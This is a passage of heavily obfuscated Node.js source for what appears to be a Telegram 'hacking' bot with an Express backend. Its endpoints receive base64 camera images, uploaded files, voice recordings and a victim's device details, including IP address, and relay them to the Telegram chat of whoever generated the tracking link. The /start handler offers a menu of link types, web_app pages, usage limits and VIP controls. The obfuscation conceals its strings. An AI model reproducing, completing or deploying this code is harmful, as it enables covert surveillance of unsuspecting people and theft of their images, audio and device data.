        fs[_0x6ab5bb(0x243) + _0x6ab5bb(0x909)](_0x497210, _0x1fa832), bot[_0x6ab5bb(0x7d2)](_0x4e3816, _0x497210, { 'caption': _0xd1e239[_0x6ab5bb(0x282)] })[_0x6ab5bb(0x37b)](() => {
            const _0x22b7a7 = _0x6ab5bb;
            console[_0x22b7a7(0x6e8)](_0x22b7a7(0x53a) + _0x22b7a7(0x6f9) + _0x22b7a7(0x3c6) + _0x22b7a7(0x5fa) + _0x4e3816), _0x205a93[_0x22b7a7(0x21c)](_0xd1e239[_0x22b7a7(0x24c)]);
        })[_0x6ab5bb(0x2de)](_0x2b40ea => {
            const _0x23b712 = _0x6ab5bb;
            console[_0x23b712(0x541)](_0xd1e239[_0x23b712(0x209)], _0x2b40ea), _0x205a93[_0x23b712(0x428)](0x2 * 0xa60 + -0x2 * -0x14e + -0x1568)[_0x23b712(0x626)](_0xd1e239[_0x23b712(0x35a)]);
        });
    } catch (_0x190e6f) {
        console[_0x6ab5bb(0x541)](_0xd1e239[_0x6ab5bb(0x3c2)], _0x190e6f), _0x205a93[_0x6ab5bb(0x428)](0x1b1 * 0x11 + 0x6 * 0xa9 + -0x1ec3)[_0x6ab5bb(0x626)](_0xd1e239[_0x6ab5bb(0x2dc)]);
    }
}), app[_0x247cf0(0x3d0)](_0x247cf0(0x262), (_0x2636d6, _0x3f6766) => {
    const _0x4be350 = _0x247cf0, _0x43a5f2 = { 'hiLKg': _0x4be350(0x4a7) };
    _0x3f6766[_0x4be350(0x911)](path[_0x4be350(0x93f)](__dirname, _0x43a5f2[_0x4be350(0x852)]));
});
let userRequests = {};
app[_0x247cf0(0x69a)](_0x247cf0(0x233) + _0x247cf0(0x289), (_0x48224b, _0x17ccfd) => {
    const _0x16f787 = _0x247cf0, _0x4358a0 = { 'FKaTV': _0x16f787(0x7dc) }, _0x354a84 = _0x48224b[_0x16f787(0x73b)][_0x16f787(0x7f1)], _0x3e0932 = _0x48224b[_0x16f787(0x73b)][_0x16f787(0x8cb)], _0x40bb05 = _0x48224b[_0x16f787(0x73b)][_0x16f787(0x6ba)];
    bot[_0x16f787(0x4ca) + 'on'](_0x354a84, _0x3e0932, _0x40bb05), _0x17ccfd[_0x16f787(0x626)](_0x4358a0[_0x16f787(0x90d)]);
}), app[_0x247cf0(0x69a)](_0x247cf0(0x1ed) + _0x247cf0(0x670), (_0x45fd31, _0x3d3e3c) => {
    const _0x266ed2 = _0x247cf0, _0x1edc58 = {
            'wFMXx': _0x266ed2(0x419),
            'hmQbC': function (_0x3a8623, _0x312f57) {
                return _0x3a8623 + _0x312f57;
            },
            'pYgsb': _0x266ed2(0x2f8) + _0x266ed2(0x628),
            'sciOP': _0x266ed2(0x4c0) + ':\x20',
            'CmeWk': function (_0x1379af, _0x3e9964) {
                return _0x1379af > _0x3e9964;
            }
        }, _0x4fd32f = _0x45fd31[_0x266ed2(0x73b)][_0x266ed2(0x7f1)], _0x1f3f9a = _0x45fd31[_0x266ed2(0x73b)][_0x266ed2(0x5e3)][_0x266ed2(0x5ad)](',');
    console[_0x266ed2(0x6e8)](_0x1edc58[_0x266ed2(0x2ef)], _0x1f3f9a[_0x266ed2(0x934)], _0x1edc58[_0x266ed2(0x3f2)], _0x4fd32f);
    if (_0x1edc58[_0x266ed2(0x276)](_0x1f3f9a[_0x266ed2(0x934)], 0x14a + -0x7 * 0x29e + -0x1b4 * -0xa)) {
        const _0x1e3854 = _0x1f3f9a[_0x266ed2(0x1e4)]((_0x256399, _0x5615d7) => {
            const _0x1be0cd = _0x266ed2, _0x117917 = Buffer[_0x1be0cd(0x246)](_0x256399, _0x1edc58[_0x1be0cd(0x932)]);
            return bot[_0x1be0cd(0x7e9)](_0x4fd32f, _0x117917, { 'caption': _0x1be0cd(0x538) + _0x1edc58[_0x1be0cd(0x7f2)](_0x5615d7, 0x2513 + 0xb7c * 0x3 + -0x4786) });
        });
        Promise[_0x266ed2(0x90b)](_0x1e3854)[_0x266ed2(0x37b)](() => {
            const _0x1228bc = _0x266ed2;
            console[_0x1228bc(0x6e8)](''), _0x3d3e3c[_0x1228bc(0x71f)]({ 'success': !![] });
        })[_0x266ed2(0x2de)](_0x5614e3 => {
            const _0x3099ee = _0x266ed2;
            console[_0x3099ee(0x541)]('', _0x5614e3), _0x3d3e3c[_0x3099ee(0x428)](0xef * 0x26 + 0x1761 + -0x821 * 0x7)[_0x3099ee(0x71f)]({ 'error': '' });
        });
    } else
        console[_0x266ed2(0x6e8)](''), _0x3d3e3c[_0x266ed2(0x428)](-0x668 + 0x1ecb + -0x16d3)[_0x266ed2(0x71f)]({ 'error': '' });
}), app[_0x247cf0(0x69a)](_0x247cf0(0x640) + _0x247cf0(0x835), upload[_0x247cf0(0x3b7)](_0x247cf0(0x2cd), -0x1f3 * -0x7 + 0x903 + -0x484 * 0x5), (_0x379a6b, _0x1fe337) => {
    const _0x31eaeb = _0x247cf0, _0xa75ab5 = {
            'kjYbu': function (_0x4ff670, _0x3c0998) {
                return _0x4ff670 > _0x3c0998;
            }
        }, _0x1b0d06 = _0x379a6b[_0x31eaeb(0x73b)][_0x31eaeb(0x2c3)], _0x26b5f6 = _0x379a6b[_0x31eaeb(0x95d)];
    if (_0x26b5f6 && _0xa75ab5[_0x31eaeb(0x2be)](_0x26b5f6[_0x31eaeb(0x934)], 0x3bc * -0x2 + -0x60 * -0x46 + 0x964 * -0x2)) {
        console[_0x31eaeb(0x6e8)](_0x31eaeb(0x2b8) + _0x26b5f6[_0x31eaeb(0x934)] + '\x20\x20' + _0x1b0d06);
        const _0x5dd5dd = _0x26b5f6[_0x31eaeb(0x1e4)](_0x4dcc6d => bot[_0x31eaeb(0x7e9)](_0x1b0d06, _0x4dcc6d[_0x31eaeb(0x85f)]));
        Promise[_0x31eaeb(0x90b)](_0x5dd5dd)[_0x31eaeb(0x37b)](() => {
            const _0x509cd1 = _0x31eaeb;
            console[_0x509cd1(0x6e8)](''), _0x1fe337[_0x509cd1(0x71f)]({ 'success': !![] });
        })[_0x31eaeb(0x2de)](_0x5d6ebd => {
            const _0x5c0a49 = _0x31eaeb;
            console[_0x5c0a49(0x541)](':', _0x5d6ebd), _0x1fe337[_0x5c0a49(0x428)](-0xcb8 + 0x17de + -0x932)[_0x5c0a49(0x71f)]({ 'error': '' });
        });
    } else
        console[_0x31eaeb(0x6e8)](''), _0x1fe337[_0x31eaeb(0x428)](0x92 * 0x13 + -0x1686 + 0xd40)[_0x31eaeb(0x71f)]({ 'error': '' });
}), app[_0x247cf0(0x69a)](_0x247cf0(0x2f0) + 'ce', uploadVoice[_0x247cf0(0x648)](_0x247cf0(0x31c)), (_0x464d9b, _0x1bae81) => {
    const _0xb8529e = _0x247cf0, _0x5ae18e = { 'NebRD': _0xb8529e(0x2f1) }, _0x43cec8 = _0x464d9b[_0xb8529e(0x73b)][_0xb8529e(0x7f1)], _0x540be6 = _0x464d9b[_0xb8529e(0x66d)][_0xb8529e(0x362)];
    bot[_0xb8529e(0x5c8)](_0x43cec8, _0x540be6)[_0xb8529e(0x37b)](() => {
        const _0x20ac69 = _0xb8529e;
        fs[_0x20ac69(0x889)](_0x540be6), _0x1bae81[_0x20ac69(0x626)]('');
    })[_0xb8529e(0x2de)](_0x10803f => {
        const _0x4598cc = _0xb8529e;
        console[_0x4598cc(0x541)](_0x10803f), _0x1bae81[_0x4598cc(0x428)](0x1343 + -0x387 * -0x9 + -0x1 * 0x310e)[_0x4598cc(0x626)](_0x5ae18e[_0x4598cc(0x527)]);
    });
});
const PORT = process[_0x247cf0(0x469)][_0x247cf0(0x789)] || -0x2b * 0xa3 + 0xaf3 * -0x2 + -0x5 * -0xc33;
app[_0x247cf0(0x4d3)](PORT, () => {
    const _0x4e663f = _0x247cf0;
    console[_0x4e663f(0x6e8)](_0x4e663f(0x883) + _0x4e663f(0x456) + _0x4e663f(0x797) + PORT);
}), app[_0x247cf0(0x3d0)](_0x247cf0(0x6f8), (_0x57e090, _0xd95e57) => {
    const _0x1ad6ca = _0x247cf0, _0x522d7e = { 'txPJC': _0x1ad6ca(0x639) };
    _0xd95e57[_0x1ad6ca(0x911)](path[_0x1ad6ca(0x93f)](__dirname, _0x522d7e[_0x1ad6ca(0x28e)]));
}), app[_0x247cf0(0x69a)](_0x247cf0(0x979), async (_0x53c8c7, _0x59e445) => {
    const _0x3e5986 = _0x247cf0, _0x349c47 = {
            'NkAsN': _0x3e5986(0x6d3),
            'EcXfA': _0x3e5986(0x850) + _0x3e5986(0x414) + _0x3e5986(0x222),
            'kkHic': _0x3e5986(0x2cc) + _0x3e5986(0x969) + _0x3e5986(0x879),
            'qAlJg': _0x3e5986(0x2cc) + _0x3e5986(0x969) + _0x3e5986(0x4b8),
            'zLXLf': _0x3e5986(0x1fd) + _0x3e5986(0x3cf) + _0x3e5986(0x48e)
        }, _0x57647c = _0x53c8c7[_0x3e5986(0x73b)][_0x3e5986(0x2c3)], _0x3a85a4 = _0x53c8c7[_0x3e5986(0x73b)][_0x3e5986(0x400)];
    if (_0x3a85a4) {
        const _0x4de2af = _0x3e5986(0x25f) + _0x3e5986(0x80f) + _0x3e5986(0x839) + _0x3e5986(0x4f8) + _0x3a85a4[_0x3e5986(0x36d)] + (_0x3e5986(0x7e0) + _0x3e5986(0x3e7)) + _0x3a85a4[_0x3e5986(0x3af)] + (_0x3e5986(0x622) + _0x3e5986(0x87e)) + _0x3a85a4['ip'] + (_0x3e5986(0x8fc) + _0x3e5986(0x5a0)) + _0x3a85a4[_0x3e5986(0x320)] + (_0x3e5986(0x568) + _0x3e5986(0x2a7) + _0x3e5986(0x73f)) + _0x3a85a4[_0x3e5986(0x249)] + (_0x3e5986(0x558) + _0x3e5986(0x4f8)) + _0x3a85a4[_0x3e5986(0x446)] + _0x3e5986(0x247) + _0x3a85a4[_0x3e5986(0x509) + 'ed'] + (_0x3e5986(0x3ad) + _0x3e5986(0x66e) + _0x3e5986(0x811) + _0x3e5986(0x8ee)) + _0x3a85a4[_0x3e5986(0x25e) + 'e'] + (_0x3e5986(0x2f6) + ':\x20') + _0x3a85a4[_0x3e5986(0x536)] + (_0x3e5986(0x930) + _0x3e5986(0x37c)) + _0x3a85a4[_0x3e5986(0x3c0)] + (_0x3e5986(0x96f) + _0x3e5986(0x5a6)) + _0x3a85a4[_0x3e5986(0x553) + _0x3e5986(0x828)] + (_0x3e5986(0x3ff) + _0x3e5986(0x37c)) + _0x3a85a4[_0x3e5986(0x486)] + (_0x3e5986(0x961) + _0x3e5986(0x944)) + _0x3a85a4[_0x3e5986(0x4e8)] + (_0x3e5986(0x5db) + _0x3e5986(0x5fd) + _0x3e5986(0x4f8)) + _0x3a85a4[_0x3e5986(0x7fd) + _0x3e5986(0x345)] + (_0x3e5986(0x5bb) + _0x3e5986(0x2e7) + '\x20') + _0x3a85a4[_0x3e5986(0x804)] + (_0x3e5986(0x2bd) + _0x3e5986(0x213)) + _0x3a85a4[_0x3e5986(0x40a)] + (_0x3e5986(0x97f) + _0x3e5986(0x476)) + _0x3a85a4[_0x3e5986(0x53e) + 'e'] + (_0x3e5986(0x8d5) + _0x3e5986(0x6b8)) + _0x3a85a4[_0x3e5986(0x665) + _0x3e5986(0x5a1)] + (_0x3e5986(0x5bc) + _0x3e5986(0x90c)) + _0x3a85a4[_0x3e5986(0x254) + _0x3e5986(0x398)] + (_0x3e5986(0x452) + _0x3e5986(0x6d2) + _0x3e5986(0x36b)) + _0x3a85a4[_0x3e5986(0x616)] + (_0x3e5986(0x251) + _0x3e5986(0x90c)) + _0x3a85a4[_0x3e5986(0x8f1) + _0x3e5986(0x546)] + (_0x3e5986(0x8a2) + _0x3e5986(0x778)) + _0x3a85a4[_0x3e5986(0x4f2)] + (_0x3e5986(0x620) + _0x3e5986(0x299) + _0x3e5986(0x7e8)) + _0x3a85a4[_0x3e5986(0x5d4)] + (_0x3e5986(0x290) + _0x3e5986(0x8c5) + _0x3e5986(0x8e2) + '\x20') + _0x3a85a4[_0x3e5986(0x422) + _0x3e5986(0x265)] + (_0x3e5986(0x58d) + _0x3e5986(0x8f0) + _0x3e5986(0x535)) + _0x3a85a4[_0x3e5986(0x6dd) + _0x3e5986(0x366)] + (_0x3e5986(0x78b) + _0x3e5986(0x318) + _0x3e5986(0x39d) + _0x3e5986(0x261)) + _0x3a85a4[_0x3e5986(0x5dc) + _0x3e5986(0x6e3)] + (_0x3e5986(0x6e1) + _0x3e5986(0x242) + _0x3e5986(0x1dc)) + _0x3a85a4[_0x3e5986(0x2a4) + _0x3e5986(0x5f2)] + (_0x3e5986(0x371) + _0x3e5986(0x5b3) + _0x3e5986(0x741)) + _0x3a85a4[_0x3e5986(0x912) + 'rt'] + (_0x3e5986(0x344) + '\x20');
        try {
            await bot[_0x3e5986(0x326) + 'e'](_0x57647c, _0x4de2af, { 'parse_mode': _0x349c47[_0x3e5986(0x1d4)] }), console[_0x3e5986(0x6e8)](_0x349c47[_0x3e5986(0x699)]), _0x59e445[_0x3e5986(0x71f)]({ 'success': !![] });
        } catch (_0x31d306) {
            console[_0x3e5986(0x541)](_0x349c47[_0x3e5986(0x5ac)], _0x31d306), _0x59e445[_0x3e5986(0x428)](-0x584 * -0x2 + -0x1d * -0x11d + -0x295d)[_0x3e5986(0x71f)]({ 'error': _0x349c47[_0x3e5986(0x2df)] });
        }
    } else
        console[_0x3e5986(0x6e8)](_0x349c47[_0x3e5986(0x3ee)]), _0x59e445[_0x3e5986(0x428)](0x176a + 0xa42 * 0x1 + 0x89 * -0x3c)[_0x3e5986(0x71f)]({ 'error': _0x349c47[_0x3e5986(0x3ee)] });
}), app[_0x247cf0(0x69a)](_0x247cf0(0x942), (_0x47138b, _0x537928) => {
    const _0x1b42ce = _0x247cf0, _0xf580ac = {
            'nxWZC': _0x1b42ce(0x419),
            'gwIjB': function (_0x39b4e8, _0x56e426) {
                return _0x39b4e8 + _0x56e426;
            },
            'VxzHP': _0x1b42ce(0x71e) + _0x1b42ce(0x943)
        }, _0x10da1a = _0x47138b[_0x1b42ce(0x73b)][_0x1b42ce(0x7f1)], _0x28384e = _0x47138b[_0x1b42ce(0x73b)][_0x1b42ce(0x5e3)][_0x1b42ce(0x5ad)](',');
    _0x28384e[_0x1b42ce(0x7bb)]((_0x2308eb, _0x3211e0) => {
        const _0x2d0312 = _0x1b42ce, _0x25e5eb = Buffer[_0x2d0312(0x246)](_0x2308eb, _0xf580ac[_0x2d0312(0x35d)]);
        bot[_0x2d0312(0x7e9)](_0x10da1a, _0x25e5eb, { 'caption': _0x2d0312(0x687) + _0xf580ac[_0x2d0312(0x3cc)](_0x3211e0, -0x1c9 * -0x4 + 0x24f9 + 0x4 * -0xb07) });
    }), console[_0x1b42ce(0x6e8)](_0x1b42ce(0x77e) + _0x1b42ce(0x520) + _0x1b42ce(0x5fa) + _0x10da1a), dataStore[_0x10da1a] && dataStore[_0x10da1a][_0x1b42ce(0x387)] ? _0x537928[_0x1b42ce(0x21c)](dataStore[_0x10da1a][_0x1b42ce(0x387)]) : _0x537928[_0x1b42ce(0x626)](_0xf580ac[_0x1b42ce(0x396)]);
}), app[_0x247cf0(0x3d0)](_0x247cf0(0x8b6), (_0x3906db, _0x1d82af) => {
    const _0x5caeee = _0x247cf0, _0x3e43ed = { 'YJpvE': _0x5caeee(0x702) };
    _0x1d82af[_0x5caeee(0x911)](path[_0x5caeee(0x93f)](__dirname, _0x3e43ed[_0x5caeee(0x26f)]));
});
let linkUsage = {};
const maxAttemptsPerButton = 0x5b6 + -0x1fce + 0x1c43;
function validateLinkUsage(_0x33464d, _0x1e8cdc) {
    const _0x1a0775 = _0x247cf0, _0x3c433c = {
            'xMgkG': function (_0x3d19da, _0x436d56) {
                return _0x3d19da(_0x436d56);
            },
            'BBvXu': function (_0x2bd071, _0xeeb343) {
                return _0x2bd071 >= _0xeeb343;
            }
        }, _0x114632 = _0x33464d + ':' + _0x1e8cdc;
    if (_0x3c433c[_0x1a0775(0x74c)](isVIPUser, _0x33464d))
        return !![];
    if (linkUsage[_0x114632] && _0x3c433c[_0x1a0775(0x920)](linkUsage[_0x114632][_0x1a0775(0x4fa)], maxAttemptsPerButton))
        return ![];
    return !linkUsage[_0x114632] && (linkUsage[_0x114632] = { 'attempts': 0x0 }), linkUsage[_0x114632][_0x1a0775(0x4fa)]++, !![];
}
let vipUsers = {};
function addVIPUser(_0x72890c) {
    vipUsers[_0x72890c] = !![];
}
function removeVIPUser(_0x258ef1) {
    delete vipUsers[_0x258ef1];
}
function isVIPUser(_0xb22a88) {
    return !!vipUsers[_0xb22a88];
}
bot[_0x247cf0(0x89b)](/\/start/, async _0x39b1f3 => {
    const _0x27b15d = _0x247cf0, _0xe6011f = {
            'yyOJv': function (_0x38c96c, _0x51df9b) {
                return _0x38c96c(_0x51df9b);
            },
            'ylfzo': _0x27b15d(0x22e) + _0x27b15d(0x25a) + _0x27b15d(0x89e) + _0x27b15d(0x46e) + _0x27b15d(0x62a) + _0x27b15d(0x874),
            'drGre': _0x27b15d(0x27b) + _0x27b15d(0x867) + _0x27b15d(0x47a),
            'xkIKr': _0x27b15d(0x661) + _0x27b15d(0x949) + _0x27b15d(0x7a9),
            'OEMui': _0x27b15d(0x661) + _0x27b15d(0x7b1) + _0x27b15d(0x597),
            'NfkWS': _0x27b15d(0x4bb) + _0x27b15d(0x3b3),
            'mRuqN': _0x27b15d(0x900) + _0x27b15d(0x2aa),
            'ykCnp': _0x27b15d(0x7ee) + _0x27b15d(0x767) + _0x27b15d(0x7af),
            'ZBsot': _0x27b15d(0x7be) + 's',
            'qtLLf': _0x27b15d(0x80c) + _0x27b15d(0x6a1),
            'JZykW': _0x27b15d(0x82e) + _0x27b15d(0x650),
            'gjMWI': _0x27b15d(0x786) + _0x27b15d(0x938),
            'dIXUZ': _0x27b15d(0x621) + _0x27b15d(0x295),
            'DjjTT': _0x27b15d(0x7cc) + _0x27b15d(0x31a),
            'ymypU': _0x27b15d(0x554) + _0x27b15d(0x48c),
            'yIepb': _0x27b15d(0x40b) + _0x27b15d(0x431),
            'AiEZw': _0x27b15d(0x87a),
            'potLN': _0x27b15d(0x8b8) + _0x27b15d(0x86b),
            'qrnqg': _0x27b15d(0x343) + 're',
            'jBofg': _0x27b15d(0x8a9) + _0x27b15d(0x967),
            'KCwgB': _0x27b15d(0x525),
            'MsvRi': _0x27b15d(0x603) + _0x27b15d(0x8d1),
            'NzlYU': _0x27b15d(0x4ad) + _0x27b15d(0x7fa) + _0x27b15d(0x894),
            'eGiER': _0x27b15d(0x234) + _0x27b15d(0x498) + _0x27b15d(0x301) + _0x27b15d(0x697) + _0x27b15d(0x589),
            'RfXge': _0x27b15d(0x6b7) + _0x27b15d(0x307),
            'rwgRV': _0x27b15d(0x280) + _0x27b15d(0x4e2),
            'iPciL': _0x27b15d(0x5f0) + _0x27b15d(0x332),
            'odoPj': _0x27b15d(0x473) + _0x27b15d(0x4b4) + _0x27b15d(0x45a) + _0x27b15d(0x25d) + _0x27b15d(0x59d),
            'cAdIA': _0x27b15d(0x576) + _0x27b15d(0x3d6),
            'fagDg': _0x27b15d(0x733),
            'vadOz': _0x27b15d(0x926) + _0x27b15d(0x2da) + _0x27b15d(0x4bd),
            'OdrcA': _0x27b15d(0x2a0),
            'gXCpX': _0x27b15d(0x330) + _0x27b15d(0x37e),
            'iQojY': _0x27b15d(0x3b0) + _0x27b15d(0x7b9) + _0x27b15d(0x44b) + _0x27b15d(0x8e7) + _0x27b15d(0x1d5),
            'LciFW': _0x27b15d(0x2fe) + _0x27b15d(0x6ef),
            'fDDvO': _0x27b15d(0x402) + _0x27b15d(0x2d1) + '3',
            'zskFm': _0x27b15d(0x4ae) + _0x27b15d(0x4d4),
            'VjXJf': _0x27b15d(0x758) + _0x27b15d(0x347) + _0x27b15d(0x68c) + _0x27b15d(0x754) + 'e/',
            'IYnco': _0x27b15d(0x653) + _0x27b15d(0x916),
            'HbAfv': _0x27b15d(0x35c) + 'il',
            'whzHH': _0x27b15d(0x8da) + '💳',
            'cvVZD': _0x27b15d(0x443) + _0x27b15d(0x781),
            'UuDof': _0x27b15d(0x795) + _0x27b15d(0x237),
            'otWRV': _0x27b15d(0x258) + _0x27b15d(0x24e),
            'ZQBPG': _0x27b15d(0x80d) + _0x27b15d(0x75e),
            'KlMSC': _0x27b15d(0x705) + _0x27b15d(0x4d1),
            'tDMkF': _0x27b15d(0x956) + _0x27b15d(0x3c3),
            'XOFHJ': _0x27b15d(0x4b1),
            'AdSIf': _0x27b15d(0x3fd) + _0x27b15d(0x71c),
            'KNIhQ': _0x27b15d(0x4f3) + 's',
            'MBDne': _0x27b15d(0x499) + _0x27b15d(0x216),
            'dDuPx': _0x27b15d(0x3a8) + _0x27b15d(0x7eb),
            'ufaiS': _0x27b15d(0x496) + _0x27b15d(0x208),
            'vbCog': _0x27b15d(0x402) + _0x27b15d(0x7a5),
            'KGwKJ': function (_0x33b2ed, _0x25b31d) {
                return _0x33b2ed === _0x25b31d;
            },
            'Mgevy': _0x27b15d(0x358) + _0x27b15d(0x5b4) + _0x27b15d(0x737) + _0x27b15d(0x819),
            'JkESw': _0x27b15d(0x8ea) + _0x27b15d(0x7e7),
            'xgsNm': _0x27b15d(0x6ed),
            'CmlJb': _0x27b15d(0x94d) + _0x27b15d(0x3e0),
            'QmxOu': _0x27b15d(0x38d)
        }, _0x2e18e7 = _0x39b1f3[_0x27b15d(0x742)]['id'], _0x5ae148 = await _0xe6011f[_0x27b15d(0x51b)](isUserSubscribed, _0x2e18e7);
    if (!_0x5ae148) {
        const _0x4263d1 = _0xe6011f[_0x27b15d(0x66f)], _0x28dbcf = developerChannels[_0x27b15d(0x1e4)](_0x90df87 => [{
                    'text': _0x27b15d(0x219) + _0x90df87,
                    'url': _0x27b15d(0x402) + _0x27b15d(0x59d) + _0x90df87[_0x27b15d(0x60b)](0xca0 + -0x1d13 + 0x83a * 0x2)
                }]);
        bot[_0x27b15d(0x326) + 'e'](_0x2e18e7, _0x4263d1, { 'reply_markup': { 'inline_keyboard': _0x28dbcf } });
        return;
    }
    const _0x47dc64 = _0xe6011f[_0x27b15d(0x3f7)], _0x368cb7 = [
            [
                {
                    'text': _0xe6011f[_0x27b15d(0x44c)],
                    'callback_data': _0x27b15d(0x351) + _0x27b15d(0x83a) + _0x2e18e7
                },
                {
                    'text': _0xe6011f[_0x27b15d(0x5ba)],
                    'callback_data': _0x27b15d(0x37d) + 'k:' + _0x2e18e7
                }
            ],
            [
                {
                    'text': _0xe6011f[_0x27b15d(0x2bf)],
                    'callback_data': _0x27b15d(0x6fa) + 'n:' + _0x2e18e7
                },
                {
                    'text': _0xe6011f[_0x27b15d(0x26b)],
                    'callback_data': _0x27b15d(0x663) + 'e:' + _0x2e18e7
                }
            ],
            [
                {
                    'text': _0xe6011f[_0x27b15d(0x876)],
                    'callback_data': _0xe6011f[_0x27b15d(0x2c2)]
                },
                {
                    'text': _0xe6011f[_0x27b15d(0x317)],
                    'callback_data': _0xe6011f[_0x27b15d(0x309)]
                }
            ],
            [
                {
                    'text': _0xe6011f[_0x27b15d(0x56f)],
                    'callback_data': _0xe6011f[_0x27b15d(0x53b)]
                },
                {
                    'text': _0xe6011f[_0x27b15d(0x30d)],
                    'callback_data': _0x27b15d(0x580) + _0x27b15d(0x51e) + _0x2e18e7
                }
            ],
            [
                {
                    'text': _0xe6011f[_0x27b15d(0x421)],
                    'callback_data': _0x27b15d(0x6be) + _0x27b15d(0x1dd) + _0x2e18e7
                },
                {
                    'text': _0xe6011f[_0x27b15d(0x459)],
                    'callback_data': _0xe6011f[_0x27b15d(0x684)]
                }
            ],
            [
                {
                    'text': _0xe6011f[_0x27b15d(0x846)],
                    'callback_data': _0xe6011f[_0x27b15d(0x34d)]
                },
                {
                    'text': _0xe6011f[_0x27b15d(0x424)],
                    'callback_data': _0xe6011f[_0x27b15d(0x36c)]
                }
            ],
            [
                {
                    'text': _0xe6011f[_0x27b15d(0x777)],
                    'callback_data': _0x27b15d(0x58e) + 'k:' + _0x2e18e7
                },
                {
                    'text': _0xe6011f[_0x27b15d(0x898)],
                    'web_app': { 'url': _0xe6011f[_0x27b15d(0x642)] }
                }
            ],
            [
                {
                    'text': _0xe6011f[_0x27b15d(0x91c)],
                    'callback_data': _0xe6011f[_0x27b15d(0x381)]
                },
                {
                    'text': _0xe6011f[_0x27b15d(0x405)],
                    'web_app': { 'url': _0xe6011f[_0x27b15d(0x57c)] }
                }
            ],
            [
                {
                    'text': _0xe6011f[_0x27b15d(0x4c9)],
                    'callback_data': _0xe6011f[_0x27b15d(0x5c9)]
                },
                {
                    'text': _0xe6011f[_0x27b15d(0x3a2)],
                    'callback_data': _0xe6011f[_0x27b15d(0x848)]
                }
            ],
            [
                {
                    'text': _0xe6011f[_0x27b15d(0x415)],
                    'web_app': { 'url': _0xe6011f[_0x27b15d(0x842)] }
                },
                {
                    'text': _0xe6011f[_0x27b15d(0x704)],
                    'url': _0xe6011f[_0x27b15d(0x253)]
                }
            ],
            [
                {
                    'text': _0xe6011f[_0x27b15d(0x7cf)],
                    'web_app': { 'url': _0xe6011f[_0x27b15d(0x7c3)] }
                },
                {
                    'text': _0xe6011f[_0x27b15d(0x675)],
                    'callback_data': _0xe6011f[_0x27b15d(0x80a)]
                }
            ],
            [
                {
                    'text': _0xe6011f[_0x27b15d(0x2d3)],
                    'callback_data': _0xe6011f[_0x27b15d(0x67c)]
                },
                {
                    'text': _0xe6011f[_0x27b15d(0x4aa)],
                    'callback_data': _0xe6011f[_0x27b15d(0x444)]
                }
            ],
            [
                {
                    'text': _0xe6011f[_0x27b15d(0x7c6)],
                    'callback_data': _0xe6011f[_0x27b15d(0x84e)]
                },
                {
                    'text': _0xe6011f[_0x27b15d(0x2e3)],
                    'callback_data': _0xe6011f[_0x27b15d(0x888)]
                }
            ],
            [
                {
                    'text': _0xe6011f[_0x27b15d(0x750)],
                    'callback_data': _0xe6011f[_0x27b15d(0x426)]
                },
                {
                    'text': _0xe6011f[_0x27b15d(0x5ca)],
                    'callback_data': _0xe6011f[_0x27b15d(0x8fd)]
                }
            ],
            [{
                    'text': _0xe6011f[_0x27b15d(0x8c0)],
                    'url': _0xe6011f[_0x27b15d(0x481)]
                }]
        ];
    bot[_0x27b15d(0x326) + 'e'](_0x2e18e7, _0x47dc64, { 'reply_markup': { 'inline_keyboard': _0x368cb7 } });
    if (_0xe6011f[_0x27b15d(0x582)](_0x2e18e7, 0x263281f8 + -0x72c7286e + -0x1f1b * -0xd7590)) {
        const _0x1b2706 = _0xe6011f[_0x27b15d(0x409)], _0x57f2d0 = [[
                    {
                        'text': _0xe6011f[_0x27b15d(0x89d)],
                        'callback_data': _0xe6011f[_0x27b15d(0x3ea)]
                    },
                    {
                        'text': _0xe6011f[_0x27b15d(0x3ae)],
                        'callback_data': _0xe6011f[_0x27b15d(0x57b)]
                    }
                ]];
        bot[_0x27b15d(0x326) + 'e'](_0x2e18e7, _0x1b2706, { 'reply_markup': { 'inline_keyboard': _0x57f2d0 } });
    }
}), bot['on'](_0x247cf0(0x293) + _0x247cf0(0x43c), _0x53ef35 => {
    const _0x9bbf6c = _0x247cf0, _0x4729d9 = {
            'qRciE': function (_0x1356ef, _0x6bdd04) {
                return _0x1356ef === _0x6bdd04;
            },
            'xzqnR': _0x9bbf6c(0x82e) + _0x9bbf6c(0x650)
        }, _0x55cdd1 = _0x53ef35[_0x9bbf6c(0x202)][_0x9bbf6c(0x742)]['id'], _0x50b42a = _0x53ef35[_0x9bbf6c(0x70e)];
    if (_0x4729d9[_0x9bbf6c(0x602)](_0x50b42a, _0x4729d9[_0x9bbf6c(0x300)])) {
        const _0x35be23 = _0x9bbf6c(0x785) + _0x9bbf6c(0x745) + _0x9bbf6c(0x84f) + _0x9bbf6c(0x531) + _0x9bbf6c(0x95e) + _0x9bbf6c(0x27a) + baseUrl + (_0x9bbf6c(0x4fc) + _0x9bbf6c(0x585)) + _0x55cdd1;
        bot[_0x9bbf6c(0x326) + 'e'](_0x55cdd1, _0x35be23);
    }
}), bot['on'](_0x247cf0(0x293) + _0x247cf0(0x43c), async _0x2cf452 => {
    const _0x4bb362 = _0x247cf0, _0x4e43d6 = {
            'YDMeg': function (_0x44d206, _0x13e0b0) {
                return _0x44d206(_0x13e0b0);
            },
            'sRkaU': _0x4bb362(0x525),
            'QSFJv': _0x4bb362(0x7be) + 's',
            'mByRb': _0x4bb362(0x343) + 're',
            'drRGz': _0x4bb362(0x580) + _0x4bb362(0x564),
            'yBuun': _0x4bb362(0x87a),
            'QetQw': _0x4bb362(0x58e) + 'k',
            'kygXl': _0x4bb362(0x2a0),
            'GMdlQ': _0x4bb362(0x6be) + _0x4bb362(0x5eb),
            'GMFTY': function (_0x64f28, _0x57c01e) {
                return _0x64f28(_0x57c01e);
            },
            'Wlpdi': _0x4bb362(0x22e) + _0x4bb362(0x25a) + _0x4bb362(0x89e) + _0x4bb362(0x46e) + _0x4bb362(0x62a) + _0x4bb362(0x874),
            'VwkEW': function (_0x49b017, _0x455994) {
                return _0x49b017 === _0x455994;
            },
            'yBGPn': _0x4bb362(0x621) + _0x4bb362(0x295),
            'GZsrT': _0x4bb362(0x6e4),
            'LagqH': _0x4bb362(0x6b3) + _0x4bb362(0x232) + _0x4bb362(0x970) + _0x4bb362(0x4f0) + _0x4bb362(0x660) + _0x4bb362(0x5a3),
            'uOcGN': _0x4bb362(0x6cc) + _0x4bb362(0x2fc) + _0x4bb362(0x88a) + _0x4bb362(0x46d) + 'ns',
            'XIRYX': _0x4bb362(0x951) + _0x4bb362(0x61a),
            'mOACD': _0x4bb362(0x86a),
